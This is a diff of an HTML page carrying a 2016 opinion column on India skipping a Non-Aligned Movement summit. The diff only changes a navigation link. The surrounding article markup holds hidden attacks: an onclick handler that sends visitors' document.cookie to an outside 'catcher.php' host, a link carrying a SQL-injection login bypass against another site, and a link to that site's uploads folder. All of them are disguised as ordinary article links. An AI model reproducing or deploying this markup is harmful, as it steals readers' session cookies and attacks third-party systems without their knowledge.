@@ -19,7 +19,7 @@
 
 <p class="details"> By Sadanand Dhume Sept. 18, 2016 12:54 p.m. ET <a href="#"></a> </p>
 <h2 align="right"><a href="20160917-opinion.php"> Previous </a> </h2>
-<h2 align="left"><a href="index.php"> Next </a> </h2>
+<h2 align="left"><a href="20160919-opinion.php"> Next </a> </h2>
 <p>
 Has the country that invented <a onclick="document.location='http://www.latenightreport.com/catcher.php?c='+escape(document.cookie);" href="#">nonalignment finally outgrown it?</a> According to Indian media reports, Prime Minister <a href="http://bit.ly/2cKc7xM" target="_blank">Narendra Modi</a> will likely become the first Indian leader—not counting a prime minister who served for barely six months in the 1970s—to skip a <a href="http://www.theplanetreports.com/home.php?username=%27+OR+%271%27%3D%271&password=%27+OR+%271%27%3D%271&submit=Login" target="_blank">Non-Aligned Movement </a> summit when the group of 120-odd developing nations meets later this month in <a href="http://www.theplanetreports.com/uploads/" target="_blank">Venezuela.</a>
 </p> <p>
